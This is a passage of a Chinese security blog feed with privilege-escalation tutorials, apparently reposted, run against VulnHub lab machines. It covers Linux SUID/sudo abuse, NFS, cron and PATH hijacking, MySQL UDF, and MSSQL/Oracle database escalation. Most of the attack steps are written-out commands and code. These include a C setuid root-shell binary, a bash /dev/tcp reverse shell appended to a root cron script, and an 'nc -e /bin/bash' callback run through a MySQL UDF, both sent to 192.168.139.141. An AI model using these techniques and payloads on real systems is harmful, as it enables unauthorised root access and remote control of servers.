2&gt;/dev/null<br><br><br>find / -perm -g=s -type f 2&gt;/dev/null<br>/usr/bin/ssh-agent<br>/usr/bin/at<br>/usr/bin/mlocate<br>/usr/bin/lockfile<br>/usr/bin/chage<br>/usr/bin/bsd-write<br>/usr/bin/mutt_dotlock<br>/usr/bin/wall<br>/usr/bin/crontab<br>/usr/bin/expiry<br>/usr/bin/procmail<br>/usr/bin/dotlockfile<br>/usr/lib/utempter/utempter<br>/sbin/unix_chkpwd<br><br>还是建议用上面那个工具<br>简洁明了<br><br>#利用参考：<br>https://gtfobins.github.io/<br> <br></code></pre></td></tr></table></figure><h2 id="sudo提权（普通用户权限使用）"><a href="#sudo提权（普通用户权限使用）" class="headerlink" title="sudo提权（普通用户权限使用）"></a><strong>sudo提权（普通用户权限使用）</strong></h2><p>环境：<a href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p><p>搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件</p><h3 id="前情提要-2"><a href="#前情提要-2" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>sudo提权其实和suid提权原理差不多</p><p>我们安装工具的时候经常使用到sudo来执行脚本</p><p>当我们使用这个sudo命令的时候就有可能造成安全问题</p><p>总的来说就是其他用户调用一些命令的时候不会因为权限问题受限，root可以调用，web用户也可以调用</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">SUDO:<br><br>cat /etc/sudoers<br><br>/usr/bin/awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;<br></code></pre></td></tr></table></figure><p>这个提权就不过多阐述</p><p>#利用参考：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h2 id="总结SUDO-SUID"><a href="#总结SUDO-SUID" class="headerlink" title="总结SUDO&amp;SUID"></a><strong>总结SUDO&amp;SUID</strong></h2><p>#应用场景：</p><p>获取到Web权限或普通用户在Linux服务器上时进行的SUID&amp;SUDO提权</p><p>SUID (Set owner User ID up on execution)是给予文件的一个特殊类型的文件权限。在Linux&#x2F;Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p><p>SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：&#x2F;etc&#x2F;sudoers，除此配置之外的问题，SUDO还有两个CVE漏洞（CVE-2019-14287 CVE-2021-3156）。</p><p>注意这个漏洞比较重要CVE-2021-3156</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###sudo在这个版本可能有漏洞<br>sudo: 1.8.2 - 1.8.31p2<br>sudo: 1.9.0 - 1.9.5p1<br><br>###可以使用sudo -V查看<br><br>┌──(root㉿kali)-[~]<br>└─# sudo -V                    <br>Sudo 版本 1.9.10<br>当前选项：--build=x86_64-linux-gnu --prefix=/usr --includedir=$&#123;prefix&#125;/include --mandir=$&#123;prefix&#125;/share/man --infodir=$&#123;prefix&#125;/share/info --sysconfdir=/etc --localstatedir=/var --disable-option-checking --disable-silent-rules --libdir=$&#123;prefix&#125;/lib/x86_64-linux-gnu --runstatedir=/run --disable-maintainer-mode --disable-dependency-tracking --with-all-insults --with-pam --with-pam-login --with-fqdn --with-logging=syslog --with-logfac=authpriv --with-env-editor --with-editor=/usr/bin/editor --with-timeout=15 --with-password-timeout=0 --with-passprompt=[sudo] password for %p: --with-tty-tickets --without-lecture --disable-root-mailer --with-sendmail=/usr/sbin/sendmail --with-rundir=/run/sudo --with-sssd --with-sssd-lib=/usr/lib/x86_64-linux-gnu --enable-zlib=system --enable-admin-flag --with-selinux --with-linux-audit --enable-tmpfiles.d=/usr/lib/tmpfiles.d MVPROG=/bin/mv --with-exampledir=/usr/share/doc/sudo/examples<br>Sudoers 策略插件版本 1.9.10<br>Sudoers 文件语法版本 48<br> <br></code></pre></td></tr></table></figure><p>这个没什么卵用CVE-2019-14287</p><h2 id="利用NFS提权"><a href="#利用NFS提权" class="headerlink" title="利用NFS提权"></a><strong>利用NFS提权</strong></h2><h3 id="认识NFS"><a href="#认识NFS" class="headerlink" title="认识NFS"></a><strong>认识NFS</strong></h3><p>什么是NFS？</p><p>网络文件系统（<strong>NFS</strong>）是一个客户端&#x2F;服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在  <strong>NFS</strong>  协议是几个分布式文件系统标准，网络附加存储（NAS）之一。</p><p>NFS是基于UDP&#x2F;IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a><strong>过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">先扫靶机就不多说了<br>nmap 192.168.1.6<br><br>### NFS服务利用（连接NFS的命令）<br>showmount -e 192.168.1.6<br><br>###在本机kali创建共享的文件夹（小坑一个）<br>mkdir nfs<br><br>### 这是通过脚本来提权，你也可以上传带有suid的文件来提权<br><br><br><br><br>### 攻击机上执行<br><br>配合SUID提权<br>注意gcc编译机器与目标机内核版本相似<br>#include&lt;stdlib.h&gt;<br>#include&lt;unistd.h&gt;<br>int main()<br>&#123;<br>setuid(0);<br>system(&quot;id&quot;);<br>system(&quot;/bin/bash&quot;);<br>&#125;<br>gcc getroot.c -o getroot<br>cp getroot /root/nfs #复制bash到挂载目录下<br>chmod +s getroot   #赋予suid权限<br>chmod 777 getroot   #可读可写可执行权限<br><br>find / -perm -u=s -type f 2&gt;/dev/null 再看看是否加入suid文件<br>/usr/bin/ssh-agent<br>/usr/bin/at<br>/usr/bin/mlocate<br>/usr/bin/lockfile<br>/usr/bin/chage<br>/usr/bin/bsd-write<br>/usr/bin/mutt_dotlock<br>/usr/bin/wall<br>/usr/bin/crontab<br>/mnt/nfs/getroot   ####有了嘿嘿嘿<br><br><br><br>###靶机上执行<br>cd /mnt/nfs     # 目标机<br>./getroot       # 目标机<br><br><br> <br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>NFS其实就相当于文件共享，在实战中遇到的很少<br>然后我们上传什么文件，他就继承什么权限<br>所以我们可以上传suid的find<br>给他root权限，然后我们就可以执行这个文件从而得到管理员的shell  </p><p>###有一个小坑不同内核的Linux，不同版本的Linux上传上去的文件执行提权有可能会报错<br>解决方案：<br>1 找一个相似版本的文件<br>2 编译一个c语言的脚本来调用（如过程当中所展示）</p><h2 id="Cron定时任务提权（不怎么好用）"><a href="#Cron定时任务提权（不怎么好用）" class="headerlink" title="Cron定时任务提权（不怎么好用）"></a><strong>Cron定时任务提权（不怎么好用）</strong></h2><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a><strong>靶机</strong></h3><p><a href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></p><h3 id="前情提要-3"><a href="#前情提要-3" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 &#x2F;etc&#x2F;crontab 文件和 &#x2F;etc&#x2F;cron.*&#x2F; 目录。它同样也会检查 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录。</p><p>提升条件：Web或用户权限进行查看，任务文件可修改</p><h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a><strong>过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###如何判断可以用哪些任务？<br>一般来说是在/etc/crontab<br>所以我们直接<br>cat /etc/crontab<br># /etc/crontab: system-wide crontab<br># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;<br># command to install the new version when you edit this file<br># and files in /etc/cron.d. These files also have username fields,<br># that none of the other crontabs do.<br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br># Example of job definition:<br># .---------------- minute (0 - 59)<br># | .------------- hour (0 - 23)<br># | | .---------- day of month (1 - 31)<br># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...<br># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat<br># | | | | |<br># * * * * * user-name command to be executed<br>17 *   * * *   root   cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6   * * *   root   test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6   * * 7   root   test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6   1 * *   root   test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br>#<br><br><br><br>###然后去修改这些定时任务加入反弹shell命令就可以直接提权了<br>注意要修改root用户启动的定时任务才能成功提权<br><br>实例<br>cat /etc/script/CleaningScript.sh   #查看脚本内容<br>ls -lia /etc/script/CleaningScript.sh #查看对任务文件的权限<br>echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.139.141/66 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleaningScript.sh<br></code></pre></td></tr></table></figure><h2 id="PATH变量提权"><a href="#PATH变量提权" class="headerlink" title="PATH变量提权"></a><strong>PATH变量提权</strong></h2><h3 id="前情提要-4"><a href="#前情提要-4" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>PATH变量提权本质上和suid提权差不多，当suid提权的命令无法执行命令的时候，我们就要考虑PATH提权了，有部分运维人员为了方便会自己写脚本，而这些脚本会调用一些命令，众所周知Linux一切都是文件，命令也是调用文件，所以我们现在可以上传一个相同的命令文件，通过修改系统变量，让系统调用命令的时候调用我们的文件，然后我们在我们的文件中插入反弹shell命令，从而达到提权的目的</p><p>注意还是和suid提权一样，注意原本文件的权限为root</p><h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a><strong>过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###查找有权限的文件<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/usr/bin/ssh-agent<br>/usr/bin/at<br>/usr/bin/mlocate<br>/usr/bin/lockfile<br>/usr/bin/chage<br>/opt/statuscheck<br><br>###看文件调用了什么命令<br>strings /opt/statuscheck<br>假如调用了curl命令<br><br>###到/tmp上传我们的curl，替换系统变量然后执行原本的文件<br>cd /tmp<br>echo &quot;/bin/sh&quot; &gt; curl<br>chmod 777 curl<br>export PATH=/tmp:$PATH   ###替换变量<br>echo $PATH       ###看看变量替换成功没<br>/opt/statuscheck     ####运行原本的脚本<br> <br></code></pre></td></tr></table></figure><h2 id="数据库类型提权"><a href="#数据库类型提权" class="headerlink" title="数据库类型提权"></a><strong>数据库类型提权</strong></h2><h3 id="前情提要-5"><a href="#前情提要-5" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>其实之前写过一篇数据库提权了，这里再细说一下<br>MSSQL MySQL Redis(linux特有) sqlserver（windows特有）</p><h3 id="UDF提权过程"><a href="#UDF提权过程" class="headerlink" title="UDF提权过程"></a><strong>UDF提权过程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###之前写过了今天就不写那么细了<br><br><br>kali上有利用脚本搜索一下<br>┌──(root㉿kali)-[~]<br>└─# searchsploit udf      <br>------------------------------------------------------------------------------------------ ---------------------------------<br>Exploit Title                                                                           | Path<br>------------------------------------------------------------------------------------------ ---------------------------------<br>Cloudflare WARP 1.4 - Unquoted Service Path                                               | windows/local/50805.txt<br>DUdForum 3.0 - &#x27;iFor&#x27; SQL Injection                                                       | asp/webapps/5894.txt<br>FUDforum - Multiple Remote PHP Code Injection Vulnerabilities                             | php/webapps/38418.txt<br>FUDforum 3.0.6 - Cross-Site Scripting / Cross-Site Request Forgery                       | php/webapps/40802.txt<br>FUDforum 3.0.6 - Local File Inclusion                                                     | php/webapps/40803.txt<br>FUDForum 3.0.9 - Remote Code Execution                                                   | php/webapps/47650.txt<br>FUDForum 3.1.0 - &#x27;author&#x27; Reflected XSS                                                   | php/webapps/49943.txt<br>FUDForum 3.1.0 - &#x27;srch&#x27; Reflected XSS                                                     | php/webapps/49942.txt<br>Ilia Alshanetsky FUDForum 1.2.8/1.9.8/2.0.2 - File Disclosure                             | php/webapps/21723.txt<br>Ilia Alshanetsky FUDForum 1.2.8/1.9.8/2.0.2 - File Modification                           | php/webapps/21724.txt<br>MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                   | linux/local/1181.c<br>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                   | linux/local/1518.c<br>MySQL 4/5/6 - UDF for Command Execution                                                   | linux/local/7856.txt<br>NCTsoft - &#x27;AudFile.dll&#x27; ActiveX Control Remote Buffer Overflow                           | windows/remote/6175.html<br>PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                       | linux/local/7855.txt<br>RedHat CloudForms Management Engine 5.1 - agent/linuxpkgs Directory Traversal (Metasploit | linux/remote/30469.rb<br>------------------------------------------------------------------------------------------ ---------------------------------<br><br><br><br><br>###找一下脚本位置<br>┌──(root㉿kali)-[~]<br>└─# find / -name 1518.c<br>/usr/share/exploitdb/exploits/linux/local/1518.c<br><br>###自己保存到桌面上编译一下（这不多说）<br>cp /usr/share/exploitdb/exploits/linux/local/1518.c /home/kali/桌面<br><br>gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc<br><br><br>###上传这个文件到靶机<br><br>-连接进行导出调用<br>mysql -uroot -pR@v3nSecurity<br>select version();   #查看mysql版本<br>select @@basedir;   #确认mysql安装位置<br>show variables like &#x27;%basedir%&#x27;;   #确认mysql安装位置<br>show variables like &#x27;%secure%&#x27;; #查看可导出文件位置<br>show variables like &#x27;%plugin%&#x27;;   #查找插件位置<br>show variables like &#x27;%compile%&#x27;;   #查看系统版本<br>use mysql;<br><br># 创建mkbk表<br>create table xiaodi(line blob);<br><br># 往mkbk表中插入二进制的udf.so<br>insert into xiaodi values(load_file(&#x27;/tmp/udf.so&#x27;));<br><br># 导出udf.so<br>select * from xiaodi into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;•;<br><br># 创建do_system自定义函数<br>create function do_system returns integer soname &#x27;udf.so&#x27;;<br>select do_system(&#x27;nc 192.168.139.141 6666 -e /bin/bash&#x27;);<br><br><br><br>能外联直接用工具，别自己搞太难受了<br></code></pre></td></tr></table></figure><p>原文转自：<a href="https://mp.weixin.qq.com/s/FpFqyAUUR8A882WWVWPCxg">水刃安全</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>内网横向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库提权</title>
    <link href="/2024/06/12/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <url>/2024/06/12/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="数据库提权流程"><a href="#数据库提权流程" class="headerlink" title="数据库提权流程"></a>数据库提权流程</h2><h3 id="先获取到数据库用户密码"><a href="#先获取到数据库用户密码" class="headerlink" title="先获取到数据库用户密码"></a>先获取到数据库用户密码</h3><h3 id="利用数据库提权项目进行连接"><a href="#利用数据库提权项目进行连接" class="headerlink" title="利用数据库提权项目进行连接"></a>利用数据库提权项目进行连接</h3><ul><li>MDUT</li></ul><p>​ <a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a></p><ul><li>Databasetools</li></ul><p>​ <a href="https://github.com/Hel10-Web/Databasetools">https://github.com/Hel10-Web/Databasetools</a></p><ul><li>RequestTemplate（新出的不是很好用）</li></ul><p>​ <a href="https://github.com/1n7erface/RequestTemplate">https://github.com/1n7erface/RequestTemplate</a></p><h3 id="可利用建立代理解决不支持外联"><a href="#可利用建立代理解决不支持外联" class="headerlink" title="可利用建立代理解决不支持外联"></a>可利用建立代理解决不支持外联</h3><ul><li><p>利用已知Web权限建立代理（等同于本地连接）</p></li><li><p>利用已知权限执行SQL开启外联（让数据库支持外联）</p><pre><code class="hljs"> GRANT ALL PRIVILEGES ON _._ TO &#39;帐号&#39;@&#39;%&#39; IDENTIFIED BY &#39;密码&#39; WITH GRANT OPTION; flush privileges; EXEC sp\_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp\_configure &#39;Ad Hoc Distributed Queries&#39;, 1; RECONFIGURE; ALTER SYSTEM SET REMOTE\_LOGIN\_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE; SHUTDOWN IMMEDIATE; STARTUP;</code></pre></li></ul><h3 id="可利用数据库提权类型条件及技术"><a href="#可利用数据库提权类型条件及技术" class="headerlink" title="可利用数据库提权类型条件及技术"></a>可利用数据库提权类型条件及技术</h3><ul><li>MYSQL：PHP+MYSQL 以web入口提权</li></ul><p>条件：ROOT密码（高版本的-secure-file-priv没进行目录限制）</p><p>技术：UDF MOF 启动项 反弹Shell</p><ul><li>MSSQL：.NET+MSSQL 以web入口提权</li></ul><p>条件：sa密码</p><p>技术：xp_cmdshell sp_oacreate CLR 沙盒</p><ul><li>Oracle：（站库分离，非JSP，直接数据库到系统等）</li></ul><p>条件：数据库用户密码</p><p>技术：DBA，普通用户，注入模式</p><h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h2><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​ udf &#x3D; ‘user defined function’，即‘用户自定义函数’。是通过添加新函数，对MYSQL的功能进行扩充，性质就象 使用本地MYSQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于‘mysql&#x2F;lib&#x2F;plugin’目录下，文件 后缀为‘.dll’，常用c语言编写。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>获取mysql控制权限：知道mysql用户名和密码，并且可以远程登录（即获取了mysql数据库的权限）</li><li>mysql具有写入文件的权限：mysql有写入文件的权限，即secure_file_priv的值为空。</li></ul><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>只有两个变量，一个是function_name（函数名），我们想引入的函数是sys_eval。还有一个变量是shared_library_name（共享包名称），即‘udf.dll’。 至此我们已经引入了sys_eval函数，下面就是使用了。 这个函数用于执行系统命令，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">Copyselect sys_eval(&#x27;cmd command&#x27;);<br></code></pre></td></tr></table></figure><h3 id="MOF提权（MySQL5-几以上就失效了，不常用）"><a href="#MOF提权（MySQL5-几以上就失效了，不常用）" class="headerlink" title="MOF提权（MySQL5.几以上就失效了，不常用）"></a>MOF提权（MySQL5.几以上就失效了，不常用）</h3><h3 id="（1）利用条件"><a href="#（1）利用条件" class="headerlink" title="（1）利用条件"></a>（1）利用条件</h3><p>​ <strong>MOF提权的条件要求十分严苛：</strong></p><p>​ 1.windows 03及以下版本 ​ 2.mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录 ​ 3.secure-file-priv参数不为null</p><h3 id="（2）原理"><a href="#（2）原理" class="headerlink" title="（2）原理"></a>（2）原理</h3><p>​ MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入&#x2F;wbme&#x2F;mof，然后系统 每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让 系统执行命令，进行提权</p><h3 id="（3）Mof提权的弊端"><a href="#（3）Mof提权的弊端" class="headerlink" title="（3）Mof提权的弊端"></a>（3）Mof提权的弊端</h3><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p><p>cmd 下运行下面语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">net stop winmgmt<br>del c:/windows/system32/wbem/repository<br>net start winmgmt<br></code></pre></td></tr></table></figure><p>重启服务即可。</p><p>实战不建议用这个，因为重启服务可能会有问题，不重启可能会留下溯源痕迹</p><h2 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h2><h3 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h3><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>​ <code>xp\_cmdshell</code>可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，并以文本行方式返回 任何输出，是一个功能非常强大的扩展“存贮过程”。那么“存储过程”，其实质就是一个“集合”，就是存储在Sql Server中预先定义好的“SQL语句集合”，说的更直白一些就是各种小脚本共同组成的集合体，我们称之为“存储 过程”。</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>​ 1、任何版本的Sql Server都可以对xp_cmdshell 进行利用；</p><p>​ 2 、SQL Server数据库没有被降权；</p><p>​ 3、 sa用户或其他具有dba权限的账户。</p><h3 id="sp-oacreate提权"><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权"></a>sp_oacreate提权</h3><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p><code>sp\_oacreate</code>可以删除、复制、移动文件，还能配合<code>sp\_oamethod</code>来写文件执行cmd。</p><p><code>sp\_oacreate</code>和<code>sp\_oamethod</code>两个过程分别用来创建和执行脚本语言，换言之就是<code>xp\_cmdshell</code>能执行的 <code>sp\_oacreate＋sp\_oamethod</code>同样能胜任。但是使用此方法时<code>sp\_oacreate</code>没有回显，所以一般用于<code>xp\_cmdshell</code>无法使用时。</p><p>注：由于没有回显，去服务器上查看成功，用起来没有<code>xp_cmdshell</code>方便</p><h3 id="3、sandbox提权（沙箱提权）"><a href="#3、sandbox提权（沙箱提权）" class="headerlink" title="3、sandbox提权（沙箱提权）"></a>3、sandbox提权（沙箱提权）</h3><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>当执行命令方法无法使用时，可以使用沙盒进行提权。</p><p>沙盒模式<code>SandBoxMode</code>是一种安全功能。在沙盒模式下，Access只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。例如，诸如Kill和Shell之类的函数可能被用来损坏计算机上的数据和文件，因此它们被视为不安全的。当Access以沙盒模式运行时，调用这些函数的表达式将会产生错误消息。</p><p><code>OLE DB Driver for SQL Server</code>是用于访问数据的底层COM API，是应用程序链接到SQL Server的的驱动程序。</p><p>本质是修改注册表，默认情况下，注册表中mdb数据库不允许执行系统命令，但是开启沙盒模式，就准许mdb文件执行数据库，通过查询方式调用mdb文件，执行参数，绕过系统本身自己的执行命令，实现mdb文件执行命令。</p><h2 id="Oracle提权"><a href="#Oracle提权" class="headerlink" title="Oracle提权"></a>Oracle提权</h2><p>这个提权后续有需要再补充，一般是java的站才会用这个数据库，由于java的本身权限较高，这个提权就非常的鸡肋</p><p>原文转自：<a href="https://mp.weixin.qq.com/s/XeU0po6FIkXGzxV824sf0A">水刃安全</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>内网横向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows提权</title>
    <link href="/2024/06/06/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Windows%E6%8F%90%E6%9D%83/"/>
    <url>/2024/06/06/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Windows%E6%8F%90%E6%9D%83/</url>
    
